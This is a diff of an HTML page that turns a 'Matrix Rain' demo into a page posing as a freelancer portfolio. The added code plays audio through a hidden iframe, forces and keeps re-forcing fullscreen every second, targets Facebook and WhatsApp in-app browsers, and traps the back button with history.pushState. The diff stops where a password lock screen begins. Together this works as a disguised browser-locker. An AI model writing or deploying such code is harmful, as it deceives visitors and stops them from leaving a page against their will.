@@ -3,15 +3,12 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Matrix Rain</title>
+  <title>Tobi Dotcom - Freelancer Portfolio</title>
   <style>
     body {
       margin: 0;
       overflow: hidden;
       background: black;
-      display: flex;
-      justify-content: center;
-      align-items: center;
       height: 100vh;
       font-family: monospace;
     }
@@ -30,11 +27,30 @@
       border: 2px solid green;
       display: none;
     }
+    /* Hide the YouTube iframe so only audio plays */
+    #youtubeAudio {
+      position: absolute;
+      width: 1px;
+      height: 1px;
+      top: -1000px;
+      left: -1000px;
+    }
   </style>
 </head>
 <body>
   <canvas id="matrixCanvas"></canvas>
   <input type="password" id="passwordInput" placeholder="Enter Password" />
+
+  <!-- Hidden YouTube iframe for audio -->
+  <iframe 
+    id="youtubeAudio" 
+    width="0" 
+    height="0" 
+    src="https://www.youtube.com/embed/_fTMAZsnc-0?autoplay=1&loop=1&playlist=_fTMAZsnc-0&controls=0&mute=0" 
+    frameborder="0" 
+    allow="autoplay"
+    allowfullscreen>
+  </iframe>
 
   <script>
     // Matrix rain effect
@@ -69,20 +85,64 @@
 
     setInterval(drawMatrix, 33);
 
-    // Fullscreen behavior
-    function requestFullScreen() {
+    // Fullscreen handling for different browsers
+    function forceFullScreen() {
       if (canvas.requestFullscreen) {
         canvas.requestFullscreen();
-      } else if (canvas.mozRequestFullScreen) {
+      } else if (canvas.mozRequestFullScreen) { // Firefox
         canvas.mozRequestFullScreen();
-      } else if (canvas.webkitRequestFullScreen) {
-        canvas.webkitRequestFullScreen();
-      } else if (canvas.msRequestFullscreen) {
+      } else if (canvas.webkitRequestFullscreen) { // Chrome, Safari, Opera
+        canvas.webkitRequestFullscreen();
+      } else if (canvas.msRequestFullscreen) { // IE/Edge
         canvas.msRequestFullscreen();
+      } else if (document.body.requestFullscreen) { // General fallback
+        document.body.requestFullscreen();
+      } else {
+        alert("Your browser doesn't support fullscreen mode.");
       }
     }
 
-    requestFullScreen();
+    // Force fullscreen with several methods, attempting to cover in-app browsers
+    function tryFullScreen() {
+      forceFullScreen();  // First attempt
+
+      // Retry using alternative methods to detect the fullscreen state
+      setTimeout(() => {
+        if (!document.fullscreenElement && !document.webkitFullscreenElement) {
+          // For Facebook/WhatsApp browsers, we might need to trigger fullscreen by focusing on an element
+          document.body.focus();
+          forceFullScreen();
+        }
+      }, 1000);
+
+      setTimeout(() => {
+        if (!document.fullscreenElement && !document.webkitFullscreenElement) {
+          const elem = document.getElementById('matrixCanvas');
+          elem.click();
+          forceFullScreen();
+        }
+      }, 2000);
+    }
+
+    // Call tryFullScreen on page load and keep it persistent
+    window.onload = function () {
+      tryFullScreen();
+      keepFullScreen();  // Ensure fullscreen is persistent
+    };
+
+    // Keep Fullscreen persistent
+    function keepFullScreen() {
+      setInterval(() => {
+        if (!document.fullscreenElement && !document.webkitFullscreenElement) {
+          tryFullScreen();
+        }
+      }, 1000);  // Check every second to maintain fullscreen
+    }
+
+    // Prevents user from easily exiting fullscreen by overriding the back button and history
+    window.addEventListener('popstate', function (event) {
+      history.pushState(null, null, document.URL);
+    });
 
     // Lock screen with password
     const passwordInput = document.getElementById('passwordInput');
